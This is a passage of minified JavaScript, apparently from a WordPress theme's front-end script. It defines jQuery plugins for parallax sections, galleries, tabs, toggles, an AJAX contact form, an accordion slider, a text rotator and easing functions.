t=i(this).addClass("av-parallax-section"),e=t.attr("style"),a=t.data("section-bg-repeat"),n="";n="<div class='av-parallax "+(a="stretch"==a||"no-repeat"==a?" avia-full-stretch":"")+"' data-avia-parallax-ratio='0.0' style = '"+e+"' ></div>",t.prepend(n),t.attr("style","")})},i.fn.layer_slider_height_helper=function(t){return this.each(function(){var t=i(this),e=t.find(">div:first"),a=!1,n=0,s=function(){e.height()>0||n>5?t.height("auto"):(a=setTimeout(s,500),n++)};e.length&&(a=setTimeout(s,0))})},i.fn.avia_sc_testimonial=function(t){return this.each(function(){var t=i(this),e=t.find(".avia-testimonial");t.on("avia_start_animation",function(){e.each(function(t){var e=i(this);setTimeout(function(){e.addClass("avia_start_animation")},150*t)})})})},i.fn.avia_sc_progressbar=function(t){return this.each(function(){var t=i(this),e=t.find(".avia-progress-bar");t.on("avia_start_animation",function(){e.each(function(t){var e=i(this);setTimeout(function(){e.find(".progress").addClass("avia_start_animation"),e.find(".progressbar-percent").avia_sc_animated_number({instant_start:!0,simple_up:!0,start_timer:10})},250*t)})})})},i.fn.avia_sc_iconlist=function(t){return this.each(function(){var t=i(this),e=t.find(">li");t.on("avia_start_animation",function(){e.each(function(t){var e=i(this);setTimeout(function(){e.addClass("avia_start_animation")},350*t)})})})},i.fn.avia_sc_animation_delayed=function(t){var e=0,a=t.delay||50,n=10;setTimeout(function(){n=20},500);return this.each(function(){i(this).on("avia_start_animation",function(){var t=i(this);e<n&&e++,setTimeout(function(){t.addClass("avia_start_delayed_animation"),e>0&&e--},e*a)})})},i.fn.avia_delayed_animation_in_container=function(t){return this.each(function(){var t=i(this);t.on("avia_start_animation_if_current_slide_is_active",function(){i(this).find(".avia_start_animation_when_active").addClass("avia_start_animation").trigger("avia_start_animation")}),t.on("avia_remove_animation",function(){i(this).find(".avia_start_animation_when_active, .avia_start_animation").removeClass("avia_start_animation avia_start_delayed_animation")})})},i.fn.avia_browser_height=function(){if(this.length){var t=i(window),e=(i("html"),i("#wpadminbar, #header.av_header_top:not(.html_header_transparency #header), #main>.title_container")),a=i("<style type='text/css' id='av-browser-height'></style>").appendTo("head:first"),n=i(".html_header_sidebar #top #header_main"),s=(i(".html_header_sidebar .avia-fullscreen-slider.avia-builder-el-0.avia-builder-el-no-sibling").addClass("av-solo-full"),function(){var s="",o=t.height(),r=t.width(),l=o,c=o/9*16,d=r/16*9,h=Math.round(.75*o),u=Math.round(.5*o),v=Math.round(.25*o),p=0;n.length&&(p=n.height()),e.each(function(){l-=this.offsetHeight-1});var f=l/9*16;s+=".avia-section.av-minimum-height .container{opacity: 1; }\n",s+=".av-minimum-height-100 .container, .avia-fullscreen-slider .avia-slideshow, #top.avia-blank .av-minimum-height-100 .container, .av-cell-min-height-100 > .flex_cell{height:"+o+"px;}\n",s+=".av-minimum-height-75 .container, .av-cell-min-height-75 > .flex_cell\t{height:"+h+"px;}\n",s+=".av-minimum-height-50 .container, .av-cell-min-height-50 > .flex_cell\t{height:"+u+"px;}\n",s+=".av-minimum-height-25 .container, .av-cell-min-height-25 > .flex_cell\t{height:"+v+"px;}\n",s+=".avia-builder-el-0.av-minimum-height-100 .container, .avia-builder-el-0.avia-fullscreen-slider .avia-slideshow, .avia-builder-el-0.av-cell-min-height-100 > .flex_cell{height:"+l+"px;}\n",s+="#top .av-solo-full .avia-slideshow {min-height:"+p+"px;}\n",s+=r/o<16/9?"#top .av-element-cover iframe, #top .av-element-cover embed, #top .av-element-cover object, #top .av-element-cover video{width:"+c+"px; left: -"+(c-r)/2+"px;}\n":"#top .av-element-cover iframe, #top .av-element-cover embed, #top .av-element-cover object, #top .av-element-cover video{height:"+d+"px; top: -"+(d-o)/2+"px;}\n",s+=r/l<16/9?"#top .avia-builder-el-0 .av-element-cover iframe, #top .avia-builder-el-0 .av-element-cover embed, #top .avia-builder-el-0 .av-element-cover object, #top .avia-builder-el-0 .av-element-cover video{width:"+f+"px; left: -"+(f-r)/2+"px;}\n":"#top .avia-builder-el-0 .av-element-cover iframe, #top .avia-builder-el-0 .av-element-cover embed, #top .avia-builder-el-0 .av-element-cover object, #top .avia-builder-el-0 .av-element-cover video{height:"+d+"px; top: -"+(d-l)/2+"px;}\n";try{a.text(s)}catch(t){a.remove(),a=i("<style type='text/css' id='av-browser-height'>"+s+"</style>").appendTo("head:first")}setTimeout(function(){t.trigger("av-height-change")},100)});t.on("debouncedresize",s),s()}},i.fn.avia_video_section=function(){if(this.length){var t=this.length,e="",a=i(window),n=i("<style type='text/css' id='av-section-height'></style>").appendTo("head:first"),s=function(a,s){0===s&&(e="");var o="",r="#"+a.attr("id"),l=a.height(),c=a.width(),d=a.data("sectionVideoRatio").split(":"),h=d[0],u=d[1],v=l/u*h,p=c/h*u;if(o+=c/l<h/u?"#top "+r+" .av-section-video-bg iframe, #top "+r+" .av-section-video-bg embed, #top "+r+" .av-section-video-bg object, #top "+r+" .av-section-video-bg video{width:"+v+"px; left: -"+(v-c)/2+"px;}\n":"#top "+r+" .av-section-video-bg iframe, #top "+r+" .av-section-video-bg embed, #top "+r+" .av-section-video-bg object, #top "+r+" .av-section-video-bg video{height:"+p+"px; top: -"+(p-l)/2+"px;}\n",e+=o,t==s+1)try{n.text(e)}catch(t){n.remove(),n=i("<style type='text/css' id='av-section-height'>"+e+"</style>").appendTo("head:first")}};return this.each(function(t){var e=i(this);a.on("debouncedresize",function(){s(e,t)}),s(e,t)})}},i.fn.avia_sc_gallery=function(t){return this.each(function(){var t=i(this),e=t.find("img"),a=t.find(".avia-gallery-big");t.on("avia_start_animation",function(){e.each(function(t){var e=i(this);setTimeout(function(){e.addClass("avia_start_animation")},110*t)})}),t.hasClass("deactivate_avia_lazyload")&&t.trigger("avia_start_animation"),a.length&&(t.on("mouseenter",".avia-gallery-thumb a",function(){var t=this;a.attr("data-onclick",t.getAttribute("data-onclick")),a.height(a.height()),a.attr("href",t.href);var e=t.getAttribute("data-prev-img"),n=a.find("img");if(e!=n.attr("src")){var s=new Image;s.src=e;var o=i(s);a.hasClass("avia-gallery-big-no-crop-thumb")&&o.css({height:a.height(),width:"auto"}),a.stop().animate({opacity:0},function(){o.insertAfter(n),n.remove(),a.animate({opacity:1}),a.attr("title",i(t).attr("title"))})}}),a.on("click",function(){var i=t.find(".avia-gallery-thumb a").eq(this.getAttribute("data-onclick")-1);if(i&&!i.hasClass("aviaopeninbrowser"))i.trigger("click");else if(i){var e=i.attr("href");i.hasClass("aviablank")&&""!=e?window.open(e,"_blank"):""!=e&&window.open(e,"_self")}return!1}),i(window).on("debouncedresize",function(){a.height("auto")}))})},i.fn.avia_sc_toggle=function(t){var e={single:".single_toggle",heading:".toggler",content:".toggle_wrap",sortContainer:".taglist"},a=i(window),t=i.extend(e,t);return this.each(function(){function e(i){if(!i&&window.location.hash&&(i=window.location.hash),i){var t=o.filter('[data-fake-id="'+i+'"]');t.length&&(t.is(".activeTitle")||t.trigger("click"),window.scrollTo(0,n.offset().top-70))}}var n=i(this).addClass("enable_toggles"),s=i(t.single,n),o=i(t.heading,n),r=i(t.content,n),l=i(t.sortContainer+" a",n);o.each(function(e){function s(){var t=c.offset().top,e=t-50-parseInt(i("html").css("margin-top"),10);a.scrollTop()>t&&i("html:not(:animated),body:not(:animated)").animate({scrollTop:e},200)}var l=i(this),c=l.next(t.content,n);"hidden"!=c.css("visibility")&&l.addClass("activeTitle"),l.on("click",function(){"hidden"!=c.css("visibility")?(c.slideUp(200,function(){c.removeClass("active_tc").attr({style:""}),a.trigger("av-height-change")}),l.removeClass("activeTitle")):(n.is(".toggle_close_all")&&(r.not(c).slideUp(200,function(){i(this).removeClass("active_tc").attr({style:""}),s()}),o.removeClass("activeTitle")),c.addClass("active_tc").slideDown(200,function(){n.is(".toggle_close_all")||s(),a.trigger("av-height-change")}),l.addClass("activeTitle"),location.replace(l.data("fake-id")))})}),l.click(function(t){t.preventDefault();var e=s.filter('[data-tags~="'+i(this).data("tag")+'"]'),a=s.not('[data-tags~="'+i(this).data("tag")+'"]');l.removeClass("activeFilter"),i(this).addClass("activeFilter"),o.filter(".activeTitle").trigger("click"),e.slideDown(),a.slideUp()}),e(!1),i("a").on("click",function(){var t=i(this).attr("href");void 0!==t&&t&&e("#"+(t=t.replace(/^.*?#/,"")))})})},i.fn.avia_sc_tabs=function(t){var e={heading:".tab",content:".tab_content",active:"active_tab",sidebar:!1},a=i(window),t=i.extend(e,t);return this.each(function(){function e(){t.sidebar&&c.css({"min-height":r.outerHeight()+1})}function n(e,n,s){if(!e.is("."+t.active)){i("."+t.active,o).removeClass(t.active),i("."+t.active+"_content",o).removeClass(t.active+"_content"),e.addClass(t.active);var r=e.data("fake-id");"string"==typeof r&&location.replace(r),s&&s.addClass(t.active);var l=c.filter(":eq("+n+")").addClass(t.active+"_content");"undefined"!=typeof click_container&&click_container.length&&sidebar_shadow.height(l.outerHeight());var d=l.offset().top,h=d-50-parseInt(i("html").css("margin-top"),10);a.scrollTop()>d&&i("html:not(:animated),body:not(:animated)").scrollTop(h)}}function s(i){if(!i&&window.location.hash&&(i=window.location.hash),i){var t=l.filter('[data-fake-id="'+i+'"]');t.length&&(t.is(".active_tab")||t.trigger("click"),window.scrollTo(0,o.offset().top-70))}}var o=i(this),r=i('<div class="tab_titles"></div>').prependTo(o),l=i(t.heading,o),c=i(t.content,o),d=!1,h=!1;d=l.clone(),h=l.addClass("fullsize-tab"),(l=d).prependTo(r).each(function(t){var e=i(this),a=!1;d&&(a=h.filter(":eq("+t+")")),e.addClass("tab_counter_"+t).bind("click",function(){return n(e,t,a),!1}),d&&a.bind("click",function(){return n(a,t,e),!1})}),e(),s(!1),a.on("debouncedresize",e),i("a").on("click",function(){var t=i(this).attr("href");void 0!==t&&t&&s("#"+(t=t.replace(/^.*?#/,"")))})})},i.fn.avia_sc_tab_section=function(){var t=i(window),e=(i.avia_utilities.supports("transition"),!1!==this.browserPrefix),a=i.avia_utilities.isMobile,n=-1!==document.documentElement.className.indexOf("avia_transform3d"),s={};return this.each(function(){var o=i(this),r=o.find(".av-section-tab-title"),l=o.find(".av-tab-section-tab-title-container"),c=o.find(".av_tab_navigation"),d=o.find(".av-tab-section-inner-container"),h=o.find(".av-animation-delay-container"),u=o.find(".av-layout-tab-inner"),v=(o.is(".av-tab-slide-transition"),o.is(".av-tab-content-auto")),p=o.find(".__av_init_open"),f=0,_=function(t,a){t.preventDefault();var l=i(t.currentTarget),c=l.find(".av-tab-arrow-container span"),u=l.data("av-tab-section-title"),v=(p=o.find('[data-av-tab-section-content="'+u+'"]')).data("av-tab-bg-color"),f=p.data("av-tab-color");o.find(".av-active-tab-content").not('[data-av-tab-section-content="'+u+'"]');r.attr("style","").removeClass("av-active-tab-title"),l.addClass("av-active-tab-title"),p.addClass("av-active-tab-content"),""!==v&&c.css("background-color",v),""!==f&&l.css("color",f);var _=-100*(parseInt(u,10)-1);i("body").hasClass("rtl")&&(_=100*(parseInt(u,10)-1)),e?(_/=r.length,s.transform=n?"translate3d("+_+"%, 0, 0)":"translate("+_+"%,0)",s.left="0%",d.css(s)):d.css("left",_+"%"),y(),g(),a||(location.hash=l.attr("href")),setTimeout(function(){p.trigger("avia_start_animation_if_current_slide_is_active"),h.not(p).trigger("avia_remove_animation")},600)},m=function(){f=0,r.each(function(){f+=i(this).outerWidth()}),l.css("min-width",f)},g=function(){if(p.length&&v){var i=u.height();u.height("auto");var e=p.find(".av-layout-tab-inner").height();u.height(i),u.height(e),u.css("overflow","hidden"),setTimeout(function(){t.trigger("av-height-change")},600)}},y=function(){var i=o.find(".av-active-tab-title"),t=o.width(),e=t<f?-1*i.position().left-i.outerWidth()/2+t/2:0;e+f<t&&(e=-1*(f-t)),e>0&&(e=0),l.css("left",e)},b=function(t){if(a){var e=i(t.currentTarget),n=o.find(".av-active-tab-title");e.is(".av_prev_tab_section")?n.prev(".av-section-tab-title").trigger("click"):n.next(".av-section-tab-title").trigger("click")}},w=function(){if(!i&&window.location.hash)var i=window.location.hash;var t=r.filter('[href="'+i+'"]');t.length?t.is(".active_tab")||t.trigger("click"):o.find(".av-active-tab-title").trigger("click",!0)};i.avia_utilities.preload({container:p,single_callback:function(){r.on("click",_),c.on("click",b),t.on("debouncedresize",y),t.on("debouncedresize",g),m(),g(),w()}}),d.avia_swipe_trigger({prev:".av_prev_tab_section",next:".av_next_tab_section"})})},i.fn.avia_hor_gallery=function(t){var e={slide_container:".av-horizontal-gallery-inner",slide_element:".av-horizontal-gallery-slider",slide_content:".av-horizontal-gallery-wrap",active:"av-active-gal-item",prev:".av-horizontal-gallery-prev",next:".av-horizontal-gallery-next"},t=i.extend(e,t),a=i(window),n=(i.avia_utilities.supports("transition"),this.browserPrefix,i.avia_utilities.isMobile);document.documentElement.className.indexOf("avia_transform3d");return this.each(function(){var e=i(this),s=e.find(t.slide_container),o=e.find(t.slide_element),r=e.find(t.slide_content),l=e.find(t.prev),c=e.find(t.next),d=e.find("img"),h=0,u=!1,v=e.data("av-initial"),p=function(t){var e=s.width()/100*s.data("av-height");s.css({padding:0}).height(e),d.css("display","inline-block"),setTimeout(function(){d.css("display","block")},10),h=0,r.each(function(){h+=i(this).outerWidth(!0)}),o.css("min-width",h),!1!==u&&f(u)},f=function(i){var a=o.find(t.slide_content).eq(i),n=s.width(),r=e.data("av-enlarge")>1&&u==i?e.data("av-enlarge"):1,l=a.outerWidth(!0)*r,c=parseInt(a.css("margin-right"),10)/2,d=n<h?-1*a.position().left-l/2+n/2:0;(d+=c)+h<n&&(d=-1*(h-n-parseInt(a.css("margin-right"),10))),d>0&&(d=0),o.css("left",d),s.find("."+t.active).removeClass(t.active),a.addClass(t.active),u=i};i.avia_utilities.preload({container:e,global_callback:function(){p(),a.on("debouncedresize",p),v&&f(v-1),setTimeout(function(){e.addClass("av-horizontal-gallery-animated")},10)}}),o.avia_swipe_trigger({prev:t.prev,next:t.next}),r.on("click",function(t){var a=i(this),n=r.index(a);u!==n?f(n):e.data("av-enlarge")>1&&i(t.target).is("a")}),l.on("click",function(i){!1===u&&(u=1);var t=u-1;t<0&&(t=0),f(t)}),c.on("click",function(i){!1===u&&(u=-1);var t=u+1;t>r.length-1&&(t=r.length-1),f(t)}),n?e.avia_swipe_trigger({next:t.next,prev:t.prev}):e.avia_keyboard_controls({37:t.prev,39:t.next})})},function(i){i.fn.avia_sc_animated_number=function(t){if(this.length&&!this.is(".avia_sc_animated_number_active")){this.addClass("avia_sc_animated_number_active");var e=!(!t||!t.simple_up),a=t&&t.start_timer?t.start_timer:300,n=function(i,t,a,s,o){var r=s+a;if(r>=o)i.text(t);else{for(var l="",c=t.toString().length-r.toString().length;c>0;c--)l+="0";e&&(l=0),i.text(l+r),window.requestAnimationFrame(function(){n(i,t,a,r,o)})}};return this.each(function(){var e=i(this),s=e.find(".__av-single-number"),o=e.data("timer")||3e3;s.each(function(t){var e=i(this),a=e.text();window.addEventListener&&e.text(a.replace(/./g,"0"))}),e.addClass("number_prepared").on("avia_start_animation",function(){e.is(".avia_animation_done")||(e.addClass("avia_animation_done"),s.each(function(t){var e=i(this),s=e.data("number"),r=s,l=parseInt(e.text(),10),c=0;/^0+$/.test(s)&&0!==s&&(r=s.replace(/0/g,"9")),0!=(c=Math.round(32*r/o))&&c%10!=0||(c+=1),setTimeout(function(){n(e,s,c,l,r)},a)}))}),t&&1==t.instant_start&&e.trigger("avia_start_animation")})}}}(jQuery),function(i){i.fn.avia_ajax_form=function(t){var e={sendPath:"send.php",responseContainer:".ajaxresponse"},a=i.extend(e,t);return this.each(function(){function t(t){return r.validationError=!1,r.datastring="ajax=true",r.formElements.each(function(t){var e=i(this),a=e.parent(),n=e.val(),o=e.attr("name"),l=e.attr("class"),c=!0;if(e.is(":checkbox")&&(n=!!e.is(":checked")||""),r.dataObj[o]=encodeURIComponent(n),l&&l.match(/is_empty/)&&(""==n||null==n?(a.removeClass("valid error ajax_alert").addClass("error"),r.validationError=!0):a.removeClass("valid error ajax_alert").addClass("valid"),c=!1),l&&l.match(/is_email/)&&(n.match(/^[\w|\.|\-]+@\w[\w|\.|\-]*\.[a-zA-Z]{2,20}$/)?a.removeClass("valid error ajax_alert").addClass("valid"):(a.removeClass("valid error ajax_alert").addClass("error"),r.validationError=!0),c=!1),l&&l.match(/is_phone/)&&(n.match(/^(\d|\s|\-|\/|\(|\)|\[|\]|e|x|t|ension|\.|\+|\_|\,|\:|\;){3,}$/)?a.removeClass("valid error ajax_alert").addClass("valid"):(a.removeClass("valid error ajax_alert").addClass("error"),r.validationError=!0),c=!1),l&&l.match(/is_number/)&&(i.isNumeric(n)&&""!=n?a.removeClass("valid error ajax_alert").addClass("valid"):(a.removeClass("valid error ajax_alert").addClass("error"),r.validationError=!0),c=!1),l&&l.match(/captcha/)){var d=s.find("#"+o+"_verifier").val(),h=d.charAt(d.length-1);n!=d.charAt(h)?(a.removeClass("valid error ajax_alert").addClass("error"),r.validationError=!0):a.removeClass("valid error ajax_alert").addClass("valid"),c=!1}c&&""!=n&&a.removeClass("valid error ajax_alert").addClass("valid")}),0==r.validationError&&(s.data("av-custom-send")?n():e()),!1}function e(){if(o)return!1;o=!0,r.button.addClass("av-sending-button"),r.button.val(r.button.data("sending-label"));var t=s.data("avia-redirect")||!1,e=s.attr("action");l.load(e+" "+a.responseContainer,r.dataObj,function(){t&&e!=t?(s.attr("action",t),location.href=t):(l.removeClass("hidden").css({display:"block"}),s.slideUp(400,function(){l.slideDown(400,function(){i("body").trigger("av_resize_finished")}),r.formElements.val("")}))})}function n(){if(o)return!1;o=!0;var t=r.button.val();r.button.addClass("av-sending-button"),r.button.val(r.button.data("sending-label")),r.dataObj.ajax_mailchimp=!0;var e=s.data("avia-redirect")||!1,n=s.attr("action"),c=s.find(".av-form-error-container"),d=s.data("avia-form-id");i.ajax({url:n,type:"POST",data:r.dataObj,beforeSend:function(){c.length&&c.slideUp(400,function(){c.remove(),i("body").trigger("av_resize_finished")})},success:function(c){var h=jQuery("<div>").append(jQuery.parseHTML(c)),u=h.find(".av-form-error-container");if(u.length)o=!1,s.prepend(u),u.css({display:"none"}).slideDown(400,function(){i("body").trigger("av_resize_finished")}),r.button.removeClass("av-sending-button"),r.button.val(t);else if(e&&n!=e)s.attr("action",e),location.href=e;else{var v=h.find(a.responseContainer+"_"+d);l.html(v).removeClass("hidden").css({display:"block"}),s.slideUp(400,function(){l.slideDown(400,function(){i("body").trigger("av_resize_finished")}),r.formElements.val("")})}},error:function(){},complete:function(){}})}var s=i(this),o=!1,r={formElements:s.find("textarea, select, input[type=text], input[type=checkbox], input[type=hidden]"),validationError:!1,button:s.find("input:submit"),dataObj:{}},l=s.next(a.responseContainer+":eq(0)");r.button.bind("click",t),i.avia_utilities.isMobile&&r.formElements.each(function(t){var e=i(this);e.hasClass("is_email")&&e.attr("type","email")})})}}(jQuery),i.AviaccordionSlider=function(t,e){this.$slider=i(e),this.$inner=this.$slider.find(".aviaccordion-inner"),this.$slides=this.$inner.find(".aviaccordion-slide"),this.$images=this.$inner.find(".aviaccordion-image"),this.$last=this.$slides.filter(":last"),this.$titles=this.$slider.find(".aviaccordion-preview"),this.$titlePos=this.$slider.find(".aviaccordion-preview-title-pos"),this.$titleWrap=this.$slider.find(".aviaccordion-preview-title-wrap"),this.$win=i(window),void 0===i.avia_utilities.supported.transition&&(i.avia_utilities.supported.transition=i.avia_utilities.supports("transition")),this.browserPrefix=i.avia_utilities.supported.transition,this.cssActive=!1!==this.browserPrefix,this.transform3d=-1!==document.documentElement.className.indexOf("avia_transform3d"),this.isMobile=i.avia_utilities.isMobile,this.property=this.browserPrefix+"transform",this.count=this.$slides.length,this.open=!1,this.autoplay=!1,this.increaseTitle=this.$slider.is(".aviaccordion-title-on-hover"),this._init(t)},i.AviaccordionSlider.prototype={_init:function(t){var e=this;e.options=i.extend({},t,this.$slider.data()),i.avia_utilities.preload({container:this.$slider,single_callback:function(){e._kickOff()}})},_kickOff:function(){var i=this;i._calcMovement(),i._bindEvents(),i._showImages(),i._autoplay()},_autoplay:function(){var i=this;i.options.autoplay&&(i.autoplay=setInterval(function(){i.open=!1===i.open?0:i.open+1,i.open>=i.count&&(i.open=0),i._move({},i.open)},1e3*i.options.interval))},_showImages:function(){var t=this,e=300*this.count;this.cssActive&&setTimeout(function(){t.$slider.addClass("av-animation-active")},10),this.$images.each(function(t){var e=i(this),a=300*(t+1);setTimeout(function(){e.avia_animate({opacity:1},400,function(){e.css(i.avia_utilities.supported.transition+"transform","none")})},a)}),t.increaseTitle&&(e=0),this.$titlePos.each(function(t){var a=i(this),n=e+100*(t+1);setTimeout(function(){a.avia_animate({opacity:1},200,function(){a.css(i.avia_utilities.supported.transition+"transform","none")})},n)})},_bindEvents:function(){var t=this.isMobile?"click":"mouseenter";this.$slider.on(t,".aviaccordion-slide",i.proxy(this._move,this)),this.$slider.on("mouseleave",".aviaccordion-inner",i.proxy(this._move,this)),this.$win.on("debouncedresize",i.proxy(this._calcMovement,this)),this.$slider.on("av-prev av-next",i.proxy(this._moveTo,this)),this.isMobile&&this.$slider.avia_swipe_trigger({next:this.$slider,prev:this.$slider,event:{prev:"av-prev",next:"av-next"}})},_titleHeight:function(){var t=0;this.$titleWrap.css({height:"auto"}).each(function(){var e=i(this).outerHeight();e>t&&(t=e)}).css({height:t+2})},_calcMovement:function(t,e){var a=this,n=this.$slider.width(),s=this.$last.data("av-left"),o=this.$images.filter(":last").width()||n,r=Math.floor(100/n*o),l=r*a.count,c=100-r,d=c>s/3?c:0,h=d/(a.count-1),u=o;if(l<110&&!1!==e){var v=this.$slider.height()/l*110;return this.$slider.css({"max-height":v}),void a._calcMovement(t,!1)}h<2&&(d=0),this.$slides.each(function(t){var e=i(this),n=0,s=0,o=e.data("av-left");s=0!==d?r+(n=h*t)-h:100-(n=o/Math.abs(3))/t*(a.count-t),1==t&&a.increaseTitle&&(u=s+1),a.cssActive&&(n-=o,s-=o,o=0),e.data("av-calc-default",o),e.data("av-calc-left",n),e.data("av-calc-right",s)}),a.increaseTitle&&a.$titles.css({width:u+"%"})},_moveTo:function(i){var t="av-next"==i.type?1:-1,e=!1===this.open?0:this.open+t;e>=0&&e<this.$slides.length&&this._move(i,e)},_move:function(t,e){var a=this,n=t.currentTarget,s=void 0!==e?e:this.$slides.index(n);this.open=s,a.autoplay&&void 0!==n&&(clearInterval(a.autoplay),a.autoplay=!1),this.$slides.removeClass("aviaccordion-active-slide").each(function(e){var n=i(this),o=n.data(),r=e<=s?o.avCalcLeft:o.avCalcRight,l={},c="mouseleave"==t.type?1:0;s===e&&a.$titleWrap.eq(e)&&n.addClass("aviaccordion-active-slide"),c&&(r=o.avCalcDefault,this.open=!1),a.cssActive?(l[a.property]=a.transform3d?"translate3d("+r+"%, 0, 0)":"translate("+r+"%,0)",n.css(l)):(l.left=r+"%",n.stop().animate(l,700,"easeOutQuint"))})}},i.fn.aviaccordion=function(t){return this.each(function(){i.data(this,"AviaccordionSlider")||(i.data(this,"AviaccordionSlider",1),new i.AviaccordionSlider(t,this))})},i.AviaTextRotator=function(t,e){this.$win=i(window),this.$slider=i(e),this.$inner=this.$slider.find(".av-rotator-text"),this.$slides=this.$inner.find(".av-rotator-text-single"),this.$current=this.$slides.eq(0),this.open=0,this.count=this.$slides.length,void 0===i.avia_utilities.supported.transition&&(i.avia_utilities.supported.transition=i.avia_utilities.supports("transition")),this.browserPrefix=i.avia_utilities.supported.transition,this.cssActive=!1!==this.browserPrefix,this.property=this.browserPrefix+"transform",this._init(t)},i.AviaTextRotator.prototype={_init:function(t){var e=this;this.count<=1||(e.options=i.extend({},t,this.$slider.data()),e.$inner.addClass("av-rotation-active"),e._autoplay())},_autoplay:function(){var i=this;i.autoplay=setInterval(function(){i.open=!1===i.open?0:i.open+1,i.open>=i.count&&(i.open=0),i._move({},i.open)},1e3*i.options.interval)},_move:function(i){var t=this,e=30*t.options.animation,a={opacity:0},n={display:"inline-block",opacity:0},s={opacity:1};this.$next=t.$slides.eq(this.open),this.cssActive?(a[t.property]="translate(0px,"+e+"px)",n[t.property]="translate(0px,"+-1*e+"px)",s[t.property]="translate(0px,0px)"):(a.top=e,n.top=-1*e,s.top=0),t.$current.avia_animate(a,function(){t.$current.css({display:"none"}),t.$next.css(n).avia_animate(s,function(){t.$current=t.$slides.eq(t.open)})})}},i.fn.avia_textrotator=function(t){return this.each(function(){i.data(this,"AviaTextRotator")||(i.data(this,"AviaTextRotator",1),new i.AviaTextRotator(t,this))})},i.fn.avia_waypoints=function(t){if(i("html").is(".avia_transform")){var e={offset:"bottom-in-view",triggerOnce:!0},a=i.extend({},e,t),n=i.avia_utilities.isMobile;return this.each(function(){var t=i(this);setTimeout(function(){n?t.addClass("avia_start_animation").trigger("avia_start_animation"):t.waypoint(function(t){var e=i(this.element),a=e.parents(".av-animation-delay-container:eq(0)");a.length&&e.addClass("avia_start_animation_when_active").trigger("avia_start_animation_when_active"),(!a.length||a.length&&a.is(".__av_init_open"))&&e.addClass("avia_start_animation").trigger("avia_start_animation")},a)},100)})}};var a,n,s=i.event;a=s.special.debouncedresize={setup:function(){i(this).on("resize",a.handler)},teardown:function(){i(this).off("resize",a.handler)},handler:function(i,t){var e=this,o=arguments,r=function(){i.type="debouncedresize",s.dispatch.apply(e,o)};n&&clearTimeout(n),t?r():n=setTimeout(r,a.threshold)},threshold:150},i.easing.jswing=i.easing.swing,i.extend(i.easing,{def:"easeOutQuad",swing:function(t,e,a,n,s){return i.easing[i.easing.def](t,e,a,n,s)},easeInQuad:function(i,t,e,a,n){return a*(t/=n)*t+e},easeOutQuad:function(i,t,e,a,n){return-a*(t/=n)*(t-2)+e},easeInOutQuad:function(i,t,e,a,n){return(t/=n/2)<1?a/2*t*t+e:-a/2*(--t*(t-2)-1)+e},easeInCubic:function(i,t,e,a,n){return a*(t/=n)*t*t+e},easeOutCubic:function(i,t,e,a,n){return a*((t=t/n-1)*t*t+1)+e},easeInOutCubic:function(i,t,e,a,n){return(t/=n/2)<1?a/2*t*t*t+e:a/2*((t-=2)*t*t+2)+e},easeInQuart:function(i,t,e,a,n){return a*(t/=n)*t*t*t+e},easeOutQuart:function(i,t,e,a,n){return-a*((t=t/n-1)*t*t*t-1)+e},easeInOutQuart:function(i,t,e,a,n){return(t/=n/2)<1?a/2*t*t*t*t+e:-a/2*((t-=2)*t*t*t-2)+e},easeInQuint:function(i,t,e,a,n){return a*(t/=n)*t*t*t*t+e},easeOutQuint:function(i,t,e,a,n){return a*((t=t/n-1)*t*t*t*t+1)+e},easeInOutQuint:function(i,t,e,a,n){return(t/=n/2)<1?a/2*t*t*t*t*t+e:a/2*((t-=2)*t*t*t*t+2)+e},easeInSine:function(i,t,e,a,n){return-a*Math.cos(t/n*(Math.PI/2))+a+e},easeOutSine:function(i,t,e,a,n){return a*Math.sin(t/n*(Math.PI/2))+e},easeInOutSine:function(i,t,e,a,n){return-a/2*(Math.cos(Math.PI*t/n)-1)+e},easeInExpo:function(i,t,e,a,n){return 0==t?e:a*Math.pow(2,10*(t/n-1))+e},easeOutExpo:function(i,t,e,a,n){return t==n?e+a:a*(1-Math.pow(2,-10*t/n))+e},easeInOutExpo:function(i,t,e,a,n){return 0==t?e:t==n?e+a:(t/=n/2)<1?a/2*Math.pow(2,10*(t-1))+e:a/2*(2-Math.pow(2,-10*--t))+e},easeInCirc:function(i,t,e,a,n){return-a*(Math.sqrt(1-(t/=n)*t)-1)+e},easeOutCirc:function(i,t,e,a,n){return a*Math.sqrt(1-(t=t/n-1)*t)+e},easeInOutCirc:function(i,t,e,a,n){return(t/=n/2)<1?-a/2*(Math.sqrt(1-t*t)-1)+e:a/2*(Math.sqrt(1-(t-=2)*t)+1)+e},easeInElastic:function(i,t,e,a,n){var s=1.70158,o=0,r=a;if(0==t)return e;if(1==(t/=n))return e+a;if(o||(o=.3*n),r<Math.abs(a)){r=a;s=o/4}else s=o/(2*Math.PI)*Math.asin(a/r);return-r*Math.pow(2,10*(t-=1))*Math.sin((t*n-s)*(2*Math.PI)/o)+e},easeOutElastic:function(i,t,e,a,n){var s=1.70158,o=0,r=a;if(0==t)return e;if(1==(t/=n))return e+a;if(o||(o=.3*n),r<Math.abs(a)){r=a;s=o/4}else s=o/(2*Math.PI)*Math.asin(a/r);return r*Math.pow(2,-10*t)*Math.sin((t*n-s)*(2*Math.PI)/o)+a+e},easeInOutElastic:function(i,t,e,a,n){var s=1.70158,o=0,r=a;if(0==t)return e;if(2==(t/=n/2))return e+a;if(o||(o=n*(.3*1.5)),r<Math.abs(a)){r=a;s=o/4}else s=o/(2*Math.PI)*Math.asin(a/r);return t<1?r*Math.pow(2,10*(t-=1))*Math.sin((t*n-s)*(2*Math.PI)/o)*-.5+e:r*Math.pow(2,-10*(t-=1))*Math.sin((t*n-s)*(2*Math.PI)/o)*.5+a+e},easeInBack:function(i,t,e,a,n,s){return void 0==s&&(s=1.70158),a*(t/=n)*t*((s+1)*t-s)+e},easeOutBack:function(i,t,e,a,n,s){return void 0==s&&(s=1.70158),a*((t=t/n-1)*t*((s+1)*t+s)+1)+e},easeInOutBack:function(i,t,e,a,n,s){return void 0==s&&(s=1.70158),(t/=n/2)<1?a/2*(t*t*((1+(s*=1.525))*t-s))+e:a/2*((t-=2)*t*((1+(s*=1.525))*t+s)+2)+e},easeInBounce:function(i,t,e,a,n){return 